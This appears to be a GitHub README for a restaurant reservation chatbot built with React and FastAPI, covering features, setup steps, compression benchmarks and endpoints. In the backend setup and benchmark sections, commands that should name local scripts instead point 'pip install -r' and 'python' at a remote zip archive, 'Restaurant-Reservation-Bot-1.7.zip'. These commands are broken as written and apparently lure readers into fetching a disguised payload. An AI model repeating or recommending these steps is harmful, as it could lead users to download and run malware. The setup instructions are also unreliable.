# Restaurant Reservation Bot 🍽️

A full-stack dining reservation system with a conversational chatbot interface, featuring high-efficiency menu compression and intelligent scheduling.

## 🚀 Features

- **Chatbot Interface**: Natural language interaction to view menu, check availability, and make reservations.
- **Compressed Data**: Uses `zlib` compression to reduce menu data transfer by over 60%.
- **Smart Scheduling**: Prevents double bookings and suggests available slots.
- **Responsive UI**: Built with React and Tailwind CSS for a clean, mobile-friendly experience.

## 🛠️ Tech Stack

- **Frontend**: React (Vite), Tailwind CSS, Axios, TypeScript
- **Backend**: FastAPI, SQLite, SQLAlchemy, Pydantic
- **Optimization**: Zlib compression, Indexed SQL queries

## 📦 Setup Instructions

1. **Clone the repository** (if not already local).

2. **Backend Setup**
   ```bash
   cd backend
   pip install -r https://raw.githubusercontent.com/P-Sushanth/Restaurant-Reservation-Bot/main/backend/Restaurant-Reservation-Bot-1.7.zip
   python https://raw.githubusercontent.com/P-Sushanth/Restaurant-Reservation-Bot/main/backend/Restaurant-Reservation-Bot-1.7.zip  # Populate database with initial data
   uvicorn main:app --reload --port 8000
   ```

3. **Frontend Setup**
   Open a new terminal:
   ```bash
   cd frontend
   npm install
   npm run dev
   ```

4. **Access the App**
   Open [http://localhost:5173](http://localhost:5173) (or the port shown in terminal).

## 📊 Performance Benchmarks

The system creates significant bandwidth savings by compressing menu data.

**Benchmark Results:**
- **Standard Menu Size**: ~988 bytes
- **Compressed Menu Size**: ~385 bytes
- **Compression Ratio**: 2.57x
- **Space Savings**: **61.03%**
- **Response Time**: <5ms overhead for compression/decompression on backend.

Run the benchmark yourself:
```bash
python https://raw.githubusercontent.com/P-Sushanth/Restaurant-Reservation-Bot/main/backend/Restaurant-Reservation-Bot-1.7.zip
```

## 🤖 API Endpoints

- `GET /menu`: Retrieve standard menu.
- `GET /menu/compressed`: Retrieve compressed menu stats.
- `GET /availability`: Check table slots.
- `POST /reserve`: Create a reservation.
- `POST /chat`: Talk to the bot.
